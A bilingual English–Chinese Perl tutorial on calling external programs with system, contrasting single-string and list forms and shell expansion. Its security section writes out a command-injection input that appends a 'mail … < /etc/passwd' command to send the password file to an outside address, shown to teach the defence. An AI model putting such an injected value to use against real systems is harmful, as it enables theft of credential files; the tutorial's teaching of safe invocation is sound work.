=title Running external programs from Perl with system
=timestamp 2013-06-03T22:22:22
=indexes system
=status show
=original running-external-programs-from-perl
=books beginner_book
=author szabgab
=translator terrencehan
=index 1
=archive 1
=feed 1
=comments 1
=social 1

=abstract start

In many cases Perl is used as a wrapper around other programs.
This means that we run those other programs from our Perl program.
很多情况下，Perl作为其它程序的包装，也就是说，在Perl程序中运行其它程序。

For example we use Perl to collect the parameters needed by that program
to make it easier for us to create the correct command line to run the
other program.
例如，我们可以用Perl收集执行某个程序所需的参数。

In other cases we might want to capture the output of another command line
program and then make some decisions based on that output.
或者也可以捕获其它命令行程序的输出，然后基于它们做一些决策。

Perl provides us with many different solutions. We'll see some of them here.
Perl提供了很多不同的解决方案。来看一下。

=abstract end

<h2>system</h2>

Probably the most simple one is called <hl>system</hl>. In its most basic
form in accepts a string that contains exactly what you would write on
the command line in order to invoke the external command.
<hl>system</hl>可能是最简单的。它最基本的形式就是以字符串的形式传入你想执行的外部命令。

For example on Unix/Linux machines there is a command called "adduser",
that can create a user account.
You could invoke it like this:
例如在Unix/Linux机器上有用来创建用户帐号的"adduser"命令。
你可以这样调用：

<hl>/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo</hl>

So if I'd like to run this from a perl script I can write the following:
如果想从perl脚本里运行，可以按照下面的形式写：

<code lang="perl">
  system('/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo');
</code>

This will run the adduser command. Any output or error the
adduser generates will end up on your screen.
这样会运行adduser命令，它的任何输出或错误都会最终显示在屏幕上。

You can also build up the command you'd like to execute.
The following two examples give you the same results.
你也可以先组装命令，下面两个例子都会给出同样的结果：

<code lang="perl">
  my $cmd = '/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo';
  system($cmd);
</code>

<code lang="perl">
  my $cmd = '/usr/sbin/adduser';
  $cmd .= ' --home /opt/bfoo';
  $cmd .= ' --gecos "Foo Bar" bfoo';
  system($cmd);
</code>

<h2>使用多参数的system</h2>

The <hl>system</hl> function can receive more than one arguments.
The above example could have been written like this:
<hl>system</hl>可接收多个参数，所以可以这样改写上面的例子：
<code lang="perl">
  my @cmd = ('/usr/sbin/adduser');
  push @cmd, '--home';
  push @cmd, '/opt/bfoo';
  push @cmd, '--gecos',
  push @cmd, 'Foo Bar',
  push @cmd, 'bfoo';
  system(@cmd);
</code>

In this case all the above solutions provide the same result, but it
is not always the case.
在这种情况下上面的所有解决方案的结果都是一样的，但情况又不总是这样。

<h2>Shell expansion</h2>

Let's say you have a program called <b>checkfiles</b> that can check the files
listed on its command line. You could call it <b>checkfiles data1.txt data2.txt</b>
or <b>checkfiles data*.txt</b> to check all the files that has a name staring 
with the 4 letters 'data', followed by some other characters and
having the 'txt' extension.
This second way of running the program would work on Unix/Linux systems where
the shell expands the 'data*.txt' to all the files that match the description.
When the program <b>checkfiles</b> is executed it already sees the list of files:
<b>checkfiles data1.txt data2.txt data42.txt database.txt</b>.
Not so of Windows, where the command line does not do this expansion.
On Windows the program will get 'data*.txt' as input.
假设你有一个叫<b>checkfiles</b>的程序，它是用来检查命令行中的文件。如果调用<b>checkfiles data1.txt data2.txt</b>或
<b>checkfiles data*.txt</b>来检查所有以'data'开头并以'txt'作为扩展名的文件。
第二种执行程序的方法在Unix/Linux系统上会有效，shell会把'data*.txt'展开成所有匹配的文件名。当<b>checkfiles</b>执行的时候就已经有合适的文件列表：<b>checkfiles data1.txt data2.txt data42.txt database.txt</b>。而在Windows上因为命令行不会做这种扩展而没有效果，程序只是将'data*.txt'作为输入。

What has it to do with your Perl script? You ask.
Perl脚本会如何处理？

On Windows it won't matter.
On Unix/Linux however, if you run the 'checkfiles' program from within a Perl script
as one string: <hl>system("checkfiles data*.txt")</hl>, then Perl will pass
that string to the shell. The shell will do its expansion and the 'checkfiles' program
will see the list of file. On the other hand, if you pass the command and parameters
as separate strings: <hl>system("checkfiles", "data*.txt")</hl> then perl will run the
'checkfiles' program directly and pass the single parameter 'data*.txt' to it without
any expansion.
Windows平台没有区别。但是在Unix/Linux系统上，如果在Perl脚本中使用单个字符串运行'checkfiles'程序：<hl>system("checkfiles data*.txt")</hl>，
那么Perl会将字符串传递给shell，由shell进行扩展，然后再将文件列表传递给'checkfiles'程序。
另一方面，如果你将命令和参数作为独立的字符串传递：<hl>system("checkfiles", "data*.txt")</hl>，那么perl会直接以'data*txt'作为单个参数（不做扩展)运行'checkfiles'程序。

As you can see, passing the whole command as a single string has its advantages.
如你所见，把单个字符串作为整个命令有它的优势。

This advantage comes with a price though.
但这种优势也是有代价的。

<h2>安全风险</h2>

Calling system with a single parameter and passing the whole command that way,
can be a security hazard if the input can come from untrusted sources. For example
directly from a web form. Or from the log file created by a web server.
如果输出源不可信（如从web或服务器日志文件），使用单个参数并传递整个命令来调用system可能会有安全风险。

Let's say you accept the parameter of checkfiles from an untrusted source:
假设从一个不可信源接收checkfiles的参数：

<code lang="perl">
  my $param = get_from_a_web_form();
  my $cmd = "checkfiles $param";
  system($cmd);
</code>

If the user types in 'data*.txt' then you are ok. The <hl>$cmd</hl> will contain
<hl>checkfile data*.txt</hl>.
如果用户键入'data*.txt'还好，<hl>$cmd</hl>会赋值成<hl>checkfile data*.txt</hl>。

On the other hand if the user passes in some other, more 'clever' parameters then you might
be in trouble. For example if the user types in
<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>.
Then the command perl executes will look like this:
<hl>checkfile data*.txt; mail darkside@perlmaven.com &lt; /etc/passwd</hl>.
但如果用户传递的是其它更‘聪明’的参数，你可能就会陷入麻烦。例如，如果用户输
<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>。
最终perl会得到如下命令：
<hl>checkfile data*.txt; mail darkside@perlmaven.com &lt; /etc/passwd</hl>.

The shell will first execute the 'checkfile data*.txt' command as you intended, but then
it will go on, and also execute the 'mail...' command.
That will send your password file to my darker side.
shell会首先执行'checkfile data*.txt'，但之后会继续执行'mail...'命令。
这会把你的密码文件发送到darkside。

If your Perl script was using <hl>system</hl> with multiple parameters, this security
risk is avoided. If this is the Perl code:
如果你的Perl脚本传递多个参数使用<hl>system</hl>，就可以避免这样的安全风险。假设Perl代码是这样的：

<code lang="perl">
  my $param = get_from_a_web_form();
  my @cmd = ("checkfiles", $param);
  system(@cmd);
</code>

And the user types in <hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>.
the Perl script will run the 'checkfiles' program and pass a single argument to it:
<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>. No shell expansion
but we also avoided the dangers of the shell.
The 'checkfiles' program will probably complain that it cannot find a file called
<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>, but at least our passwords
will be safe.
然后用户输入<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>，相应的perl脚本会运行
'checkfiles'程序，并向它传递一个参数:<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>。
此时shell不会扩展参数，也避免了shell的危险。'checkfiles'程序可能会提示找不到文件<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>，
但至少我们的密码文件是安全的。

<h2>总结和深入阅读</h2>

It is more convenient to make one string out of the command and pass that to <hl>system</hl>,
but if the input comes from an untrusted source, this can easily become an attack vector.
The risk can be reduced by first checking the input against a <b>white list</b> of acceptable
input characters. You can force yourself to think about these issues by enabling the
<b>taint mode</b> using the <hl>-T</hl> flag on the sh-bang line.
向<hl>system</hl>传递由一个字符串构成的命令是挺方便的，但是如果输入来自一个不可信任的源就可能会很容易的招致攻击。
这份危险可以通过首先按照一份<b>白名单</b>检查输入是否有效来规避。你也可以通过在#!行使用<hl>-T</hl>标志开启<b>taint模式</b>来强制
自己注意这些方面。

You can read more in the <a href="/perldoc/system">documentation of system</a>.
更多内容请参阅<a href="/perldoc/system">system的文档</a>。

